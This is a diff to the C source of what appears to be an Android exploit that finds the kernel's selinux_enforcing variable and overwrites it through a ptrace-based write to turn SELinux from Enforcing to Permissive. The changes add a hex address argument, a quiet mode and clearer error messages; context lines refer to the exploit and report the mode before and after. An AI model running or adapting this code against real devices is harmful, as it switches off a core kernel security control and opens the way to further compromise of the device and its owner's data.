@@ -94,7 +94,7 @@ void ptrace_write_value_at_address(unsigned long int address, void *value) {
 	if (pid == 0) {
 		ret = ptrace(PTRACE_TRACEME, 0, 0, 0);
 		if (ret < 0) {
-			fprintf(stderr, "PTRACE_TRACEME failed\n");
+			fprintf(stderr, "PTRACE_TRACEME failed: %s\n", strerror(errno));
 		}
 		bChiled = true;
 		signal(SIGSTOP, SIG_IGN);
@@ -152,7 +152,7 @@ int get_addresses() {
 		i = fscanf(f, "%lx %c %512s", &addr, &type, symname);
 		if (i == EOF) {
 			fclose(f);
-			printf("Can't find selinux_enforcing symbol");
+			printf("Can't find selinux_enforcing symbol\n");
 			return(-1);
 		}
 
@@ -186,11 +186,19 @@ int main(int argc, char **argv) {
 	char devicename[PROP_VALUE_MAX];
 	char buildid[PROP_VALUE_MAX];
 	int i;
+	int quiet = 0;
+
+	if (argc > 1) {
+		selinux_enforcing_address = strtol(argv[1], NULL, 16);
+		quiet = 1;
+	}
 
 	__system_property_get("ro.build.product", devicename);
 	__system_property_get("ro.build.id", buildid);
-	printf("ro.build.product=%s\n", devicename);
-	printf("ro.build.id=%s\n", buildid);
+	if (!quiet) {
+		printf("ro.build.product=%s\n", devicename);
+		printf("ro.build.id=%s\n", buildid);
+	}
 
 	for (i = 0; i < num_known_devices; i++) {
 		if (strcmp(known_devices[i].product, devicename) == 0 &&
@@ -208,8 +216,10 @@ int main(int argc, char **argv) {
 		printf("Can't read selinux_enforcing. Exploit will not work\n");
 		exit(EXIT_FAILURE);	
 	}	
-	printf("selinux_enforcing is at 0x%lx\n", selinux_enforcing_address);
-	printf("Initial SELinux mode is %s\n", val ? "Enforcing" : "Permissive");
+	if (!quiet) {
+		printf("selinux_enforcing is at 0x%lx\n", selinux_enforcing_address);
+		printf("Initial SELinux mode is %s\n", val ? "Enforcing" : "Permissive");
+	}
 	if (val != 1 && val != 0) {
 		printf("Suspicious initial value - not changing it.\n");
 		exit(EXIT_FAILURE);
@@ -220,6 +230,7 @@ int main(int argc, char **argv) {
 		printf("Can't read back selinux_enforcing. Exploit will not work\n");
 		exit(EXIT_FAILURE);	
 	}	
-	printf("SELinux mode is now %s\n", val ? "Enforcing" : "Permissive");
+	if (!quiet)
+		printf("SELinux mode is now %s\n", val ? "Enforcing" : "Permissive");
 	exit(EXIT_SUCCESS);
 }
